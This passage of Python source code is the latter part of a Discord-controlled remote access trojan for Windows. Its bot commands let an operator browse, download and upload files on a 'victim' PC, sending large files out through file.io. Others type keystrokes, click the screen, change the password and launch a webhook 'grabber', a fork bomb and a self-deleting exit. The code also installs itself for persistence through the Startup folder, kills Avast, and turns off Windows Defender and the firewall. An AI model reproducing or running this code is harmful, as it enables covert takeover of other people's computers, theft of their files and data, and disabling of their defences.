                loop = asyncio.get_event_loop()
                await loop.run_in_executor(
                    None,
                    ctypes.windll.user32.SystemParametersInfoW,
                    20, 0, path, 0
                )

            await set_wallpaper()
            await ctx.send(":white_check_mark: Done!")
        else:
            await ctx.send(":x: Please attach an image to use as the wallpaper.")
    else:
        return

@bot.command(help="Changes directory")
async def cd(ctx, *, dir: str):
    global current_directory
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            new_dir = os.path.join(current_directory, dir)
            if os.path.isdir(new_dir):
                current_directory = new_dir
                await ctx.send(f":white_check_mark: Changed directory to {current_directory}")
            else:
                await ctx.send(":x: Directory does NOT exist.")
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return

@bot.command(help="Deletes this file and leave no traces whatsoever.")
async def getout(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        def com():
            filename = inspect.getframeinfo(inspect.currentframe()).filename
            pid = os.getpid()
            bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(pid) + " &" + " del " + '"' + filename + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
            temp = os.getenv("TEMP")
            command = temp + r"\delete.bat"

            if os.path.isfile(command):
                delete = "del " + command + r" /f"
                os.system(delete)

            with open(command, 'w') as f5:
                f5.write(bat)

            os.system(r"start /min %temp%\delete.bat")

        thread = threading.Thread(target=com)
        thread.start()

        await ctx.send(":white_check_mark: Initiated self-destruction.")
    else:
        return

@bot.command(help="Downloads a file.")
async def download(ctx, *, name: str):
    global current_directory
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        filename = os.path.join(current_directory, name)

        async def handle_download():
            check2 = os.stat(filename).st_size
            if check2 > 7340032:
                await ctx.send("⏲️ This may take a while because it is over 8 MB. Please wait...")
                loop = asyncio.get_event_loop()
                response = await loop.run_in_executor(None, lambda: requests.post('https://file.io/', files={"file": open(filename, "rb")}).json())
                link = response["link"]
                await ctx.send(":white_check_mark: Download link: " + link)
                await ctx.send(":white_check_mark: Got it!")
            else:
                file = discord.File(filename, filename=name)
                await ctx.send(":white_check_mark: Got it!", file=file)

        await handle_download()
    else:
        return

@bot.command(help="Uploads a file.")
async def upload(ctx, *, path: str):
    global current_directory
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        path = os.path.join(current_directory, path)
        await ctx.message.attachments[0].save(path)
        await ctx.send(":white_check_mark: Uploaded!")
    else:
        return

@bot.command(help="signs the victim out of the PC.")
async def signout(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        os.system("shutdown /l /f")
        await ctx.send(":white_check_mark: Done!")
    else:
        return

@bot.command(help=" do NOT bother trying this command because this does NOT work")
async def changewinpin(ctx, password: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                await ctx.send(":x: EXE File does NOT have Admin privileges.")
                return

            command = f"net user %username% {password}"
            asyncio.to_thread(os.popen, command).read().strip()

            await ctx.send(f":white_check_mark: Success: Password changed to {password}")
        except Exception as e:
            await ctx.send(f":x: Error (Exception): {e}")
    else:
        return

@bot.command(help="gets the current directory you are on")
async def getdir(ctx):
    global current_directory
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        output = current_directory
        await ctx.send(":white_check_mark: Current directory: " + output)
    else:
        return

@bot.command(help="types out a text you input.")
async def type(ctx, txt):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            keyboard.write(txt)
            await ctx.send(":white_check_mark: Typed " + txt + "!")
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return
    
@bot.command(help="Clicks a button on image attached (does NOT work)")
async def click(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]

            with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as temp_file:
                await attachment.save(temp_file)
                temp_file_path = temp_file.name

            try:
                locations = pyautogui.locateAllOnScreen(temp_file_path, confidence=0.8)

                for location in locations:
                    pyautogui.moveTo(location)
                    pyautogui.click()
                    await ctx.send(":white_check_mark: Button pressed!")
                    os.remove(temp_file_path)
                    return

                await ctx.send(":x: Can't click: Button not found on screen.")
                os.remove(temp_file_path)
            except Exception as e:
                await ctx.send(f":x: An error occurred: {str(e)}")
                os.remove(temp_file_path)
        else:
            await ctx.send(":x: No button image attached.")
    else:
        return

@bot.command(help="Presses a key")
async def press(ctx, *, keys: str):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            combinations = keys.strip().split("+")
            keyboard.press_and_release("+".join(combinations))
            await ctx.send(f":white_check_mark: Pressed `{keys}`")
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return

@bot.command(help="Switches windows with directions such as next and previous.")
async def switchwindow(ctx, direction: str = "next"):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            if direction.lower() == "next":
                keyboard.press_and_release("alt+tab")
            elif direction.lower() == "previous":
                keyboard.press_and_release("alt+shift+tab")
            else:
                await ctx.send(":x: Invalid direction! Use 'next' or 'previous'.")
                return
            await ctx.send(f":white_check_mark: Switched to the {direction.lower()} window successfully!")
        except Exception as e:
            await ctx.send(f":x: An error occurred: {e}")
    else:
        return

@bot.command(help="Switches tab with directions such as next and previous.")
async def switchtab(ctx, direction: str = "next"):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            if direction.lower() == "next":
                keyboard.press_and_release("ctrl+tab")
            elif direction.lower() == "previous":
                keyboard.press_and_release("ctrl+shift+tab")
            else:
                await ctx.send(":x: Invalid direction! Use 'next' or 'previous'.")
                return
            await ctx.send(f":white_check_mark: Switched to the {direction.lower()} tab successfully!")
        except Exception as e:
            await ctx.send(f":x: An error occurred: {e}")
    else:
        return

@bot.command(help="Triggers my grabber.")
async def grabber(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        try:
            category = ctx.channel.category
            info_channel = await category.create_text_channel("info")
            webhook = await info_channel.create_webhook(name="XMYSTIC GRABBER")
            webhook_url = webhook.url
            update([f'webhook={webhook_url}'])
            threading.Thread(target=stabilizeTicks).start()
            await ctx.send(":white_check_mark: Triggered! Please wait...")
        except Exception as e:
            await ctx.send(f":x: Error: {e}")
    else:
        return
    
@bot.command(help="Fork bomb!")
async def forkbomb(ctx):
    if ctx.channel.category and ctx.channel.category.name == f"PC {pc_name}" and ctx.channel.name == "commands":
        path = os.path.expanduser("~")
        
        with open(f'{path}\\sysinfo.bat', 'w', encoding='utf-8') as file:
            file.write('%0|%0')

        subprocess.Popen(f'{path}\\sysinfo.bat', creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        return

# FEATURES
def startup(file_path=""):
    startup_is = False
    temp = os.getenv("TEMP")
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % os.getlogin()
    if file_path == "":
        file_path = sys.argv[0]
    with open(bat_path + '\\' + "Update.bat", "w+") as bat_file:
        bat_file.write(r'start "" "%s"' % file_path)
    startup_is = True
    return startup_is

def disable_avast():
    avast_processes = ['AvastUI.exe', 'AvastSvc.exe']
    avast_services = ['avast! Antivirus', 'avastsvc']

    for process in psutil.process_iter(['name']):
        if process.info['name'] in avast_processes:
            print("Avast detected, terminating...")
            try:
                for proc in psutil.process_iter(['pid', 'name']):
                    if proc.info['name'] in avast_processes:
                        os.kill(proc.info['pid'], 9)

                for service in avast_services:
                    subprocess.run(f'net stop "{service}"', shell=True, check=True)

                return "Avast has been disabled successfully."
            except Exception as e:
                return f"Error disabling Avast: {e}"

    return "not running"

def disable_windows_defender():
    try:
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .exe", shell=True)
        subprocess.call("powershell.exe -command Add-MpPreference -ExclusionExtension .tmp", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -EnableControlledFolderAccess Disabled", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -PUAProtection disable", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableBlockAtFirstSeen $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableIOAVProtection $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisablePrivacyMode $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableArchiveScanning $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableIntrusionPreventionSystem $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -DisableScriptScanning $true", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -SubmitSamplesConsent 2", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -MAPSReporting 0", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -HighThreatDefaultAction 6 -Force", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -LowThreatDefaultAction 6", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -SevereThreatDefaultAction 6", shell=True)
        subprocess.call("powershell.exe -command Set-MpPreference -ScanScheduleDay 8", shell=True)
        subprocess.call("powershell.exe -command netsh advfirewall set allprofiles state off", shell=True)

        return "Windows Defender has been disabled successfully."
    except Exception as e:
        return f"Error disabling Windows Defender: {e}"

def disable_av():
    avast_status = disable_avast()
    
    if "Error" in avast_status or "not running" in avast_status:
        return disable_windows_defender()

    return avast_status

def runvalidbot(tokens):
    for token in tokens:
        is_valid, message = validate_bot(token)
        if is_valid:
            print(f"Valid token found: {token}")
            print(message)
            bot.run(token)
            return
        else:
            print(message)

    print("Error: All tokens are invalid.")

if __name__ == "__main__":
    triggerconfig()

    threading.Thread(target=create_ui).start()
    
    tokenmain = config.get("token")
    token_1 = config.get("token_1")
    token_2 = config.get("token_2")
    token_3 = config.get("token_3")

    runvalidbot([tokenmain, token_1, token_2, token_3])
